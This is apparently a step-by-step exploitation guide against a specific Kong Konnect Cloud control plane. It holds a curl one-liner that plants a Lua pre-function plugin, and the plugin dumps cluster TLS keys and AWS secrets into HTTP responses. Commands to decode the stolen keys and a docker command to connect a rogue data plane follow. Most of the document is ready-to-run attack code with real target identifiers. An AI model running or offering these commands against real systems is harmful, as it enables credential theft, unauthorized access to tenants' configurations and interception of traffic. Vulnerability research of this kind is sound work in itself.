# Kong Konnect Cloud - Quick Exploitation Guide

## Target Info
- **Proxy URL:** https://kong-7e8e8991d8eup6ddo.kongcloud.dev
- **Control Plane ID:** 31e9cc86-cf77-4fd9-ad4e-f2e6f1a9bf65
- **Admin API:** https://eu.api.konghq.com/v2/control-planes/31e9cc86-cf77-4fd9-ad4e-f2e6f1a9bf65

## Step 1: Get Fresh Token

1. Login to https://cloud.konghq.com
2. Open DevTools (F12) → Network tab
3. Make any API request in UI
4. Copy the `Authorization: Bearer ...` value

## Step 2: One-Liner Exploit (Replace TOKEN)

```bash
export TOKEN="YOUR_NEW_TOKEN_HERE" && \
curl -s -X POST "https://eu.api.konghq.com/v2/control-planes/31e9cc86-cf77-4fd9-ad4e-f2e6f1a9bf65/core-entities/plugins" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"name":"pre-function","config":{"access":["local out={\"=== EXFIL ===\"}; local vars={\"KONG_CLUSTER_CERT\",\"KONG_CLUSTER_CERT_KEY\",\"AWS_ACCESS_KEY_ID\",\"AWS_SECRET_ACCESS_KEY\"}; for _,v in ipairs(vars) do local ok,val=pcall(kong.vault.get,\"{vault://env/\"..v..\"}\"); out[#out+1]=v..\"=\"..tostring(val) end; kong.response.exit(200,table.concat(out,\"\\n\"))"]},"enabled":true}' && \
echo "Waiting 20s for propagation..." && sleep 20 && \
echo "=== STOLEN DATA ===" && \
curl -s "https://kong-7e8e8991d8eup6ddo.kongcloud.dev/any-path" && \
echo ""
```

## Step 3: Python Exploit (Alternative)

```bash
TOKEN="YOUR_NEW_TOKEN_HERE" python3 exploit_kong.py
```

## Step 4: Decode Stolen Base64 Keys

```bash
# Decode certificate
echo "<KONG_CLUSTER_CERT_BASE64>" | base64 -d > cluster.crt

# Decode private key
echo "<KONG_CLUSTER_CERT_KEY_BASE64>" | base64 -d > cluster.key

# Verify
openssl x509 -in cluster.crt -noout -text
openssl ec -in cluster.key -noout -text
```

## Step 5: Connect Rogue Data Plane (Post-Exploitation)

```bash
# Extract CP hostname from Proxy URL
# kong-7e8e8991d8eup6ddo -> 7e8e8991d8

docker run --rm -it --name rogue-dp \
  -e "KONG_ROLE=data_plane" \
  -e "KONG_DATABASE=off" \
  -e "KONG_CLUSTER_CONTROL_PLANE=7e8e8991d8.eu.cp0.konghq.com:443" \
  -e "KONG_CLUSTER_TELEMETRY_ENDPOINT=7e8e8991d8.eu.tp0.konghq.com:443" \
  -e "KONG_CLUSTER_CERT=/etc/kong/cluster.crt" \
  -e "KONG_CLUSTER_CERT_KEY=/etc/kong/cluster.key" \
  -e "KONG_LUA_SSL_TRUSTED_CERTIFICATE=system" \
  -e "KONG_CLUSTER_SERVER_NAME=7e8e8991d8.eu.cp0.konghq.com" \
  -v $(pwd)/stolen_keys_new/cluster.crt:/etc/kong/cluster.crt:ro \
  -v $(pwd)/stolen_keys_new/cluster.key:/etc/kong/cluster.key:ro \
  kong/kong-gateway:3.9
```

## Impact

With stolen `KONG_CLUSTER_CERT_KEY`:

1. **Rogue Data Plane** - Register unauthorized DP to receive all configs
2. **Configuration Theft** - Access all routes, services, plugins
3. **Cross-Tenant Access** - If keys are shared across tenants
4. **MITM Attack** - Decrypt CP↔DP communication

## Lua Payload Explained

```lua
local out = {"=== EXFIL ==="}
local vars = {
  "KONG_CLUSTER_CERT",      -- mTLS certificate
  "KONG_CLUSTER_CERT_KEY",  -- PRIVATE KEY!
  "AWS_ACCESS_KEY_ID",      -- AWS credentials
  "AWS_SECRET_ACCESS_KEY"   -- AWS secret
}

for _, v in ipairs(vars) do
  -- Access env vars via vault reference
  local ok, val = pcall(kong.vault.get, "{vault://env/" .. v .. "}")
  out[#out + 1] = v .. "=" .. tostring(val)
end

-- Return exfiltrated data in response
kong.response.exit(200, table.concat(out, "\n"))
```

**Date:** December 1, 2025
**Severity:** CRITICAL (CVSS 9.8)
